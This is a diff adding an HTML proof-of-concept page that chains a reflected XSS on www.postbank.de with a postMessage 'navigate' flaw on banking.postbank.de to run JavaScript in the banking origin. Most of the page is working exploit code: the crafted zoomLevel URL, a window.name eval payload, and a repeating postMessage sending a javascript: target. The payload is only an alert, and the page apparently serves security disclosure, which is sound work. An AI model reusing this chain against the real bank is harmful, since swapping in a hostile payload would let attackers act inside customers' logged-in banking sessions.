@@ -1,0 +1,54 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>banking.postbank.de sibling-origin postMessage XSS — chained PoC</title>
+  <style>body{font:16px sans-serif;max-width:720px;margin:40px auto;padding:0 16px}
+  button{font-size:18px;padding:10px 18px;cursor:pointer}code{background:#eee;padding:1px 4px;font-size:13px}
+  ol{line-height:1.7}#status{margin-top:14px;color:#060}.n{color:#555;font-size:14px}</style>
+</head>
+<body>
+  <h2><code>banking.postbank.de</code> &mdash; cross-origin <b>postMessage &rarr; navigate &rarr; javascript:</b> XSS</h2>
+  <p class="n">The banking SPA trusts any message whose origin shares the registrable domain
+  (<code>removeSubdomain = split('.').slice(-2)</code> &rarr; both <code>www.postbank.de</code> and
+  <code>banking.postbank.de</code> collapse to <code>postbank.de</code>). A <code>navigate</code> message is
+  passed to <code>unsafeExternalRedirect(target)</code> &rarr; <code>location.href = target</code> with no
+  scheme allowlist, and CSP <code>script-src 'unsafe-inline'</code> lets <code>javascript:</code> run.</p>
+  <p class="n">A page on a non-<code>postbank.de</code> origin (like this one) can't send the message directly,
+  so this PoC first bootstraps onto the <code>postbank.de</code> origin through the confirmed
+  <code>www.postbank.de</code> reflected XSS (YellowMap <code>zoomLevel</code> &rarr;
+  <code>self['eval'](window['name'])</code>), then opens banking and fires the <code>navigate</code> message.</p>
+  <ol>
+    <li>Click <b>Run PoC</b> (the click lets the browser open the windows).</li>
+    <li>A <code>www.postbank.de</code> tab opens (bootstrap) which opens the <b>banking /demo/</b> window.</li>
+    <li>In the banking demo window, click <b>Weiter</b> (demo login — a real logged-in victim skips this).</li>
+    <li><b>alert("PBX banking.postbank.de")</b> fires on the <code>banking.postbank.de</code> origin.</li>
+  </ol>
+  <button onclick="go()">Run PoC</button>
+  <div id="status"></div>
+
+  <script>
+    // javascript: payload that executes on banking.postbank.de
+    var TARGET = "javascript:alert('PBX '+document.domain)//";
+
+    // JS eval'd on www.postbank.de via the zoomLevel sink (set as the opened window's name,
+    // so it never passes through the zoomLevel character filter):
+    var NAME =
+      "b=open('https://banking.postbank.de/demo/#/services/overview','bk');" +
+      "window.__p=" + JSON.stringify(TARGET) + ";" +
+      "setInterval(function(){try{b.postMessage({id:'navigate',payload:{target:window.__p}},'*')}catch(e){}},600)";
+
+    // www.postbank.de reflected-XSS URL: zoomLevel = self['eval'](window['name'])
+    var RESULT = 'https://www.postbank.de/cip/engine/pb/content/gdata/Presentation/YellowMapDE/Result.aspx' +
+      '?catchwords=Bank&zoomLevel=' + encodeURIComponent("self['eval'](window['name'])");
+
+    function go() {
+      // 2nd arg becomes window.name of the www popup -> eval'd on postbank.de origin
+      var w = window.open(RESULT, NAME);
+      document.getElementById('status').textContent = w
+        ? 'Bootstrap opened. Click "Weiter" in the banking demo window — alert fires on banking.postbank.de.'
+        : 'Popup blocked — allow popups for this site and click Run PoC again.';
+    }
+  </script>
+</body>
+</html>
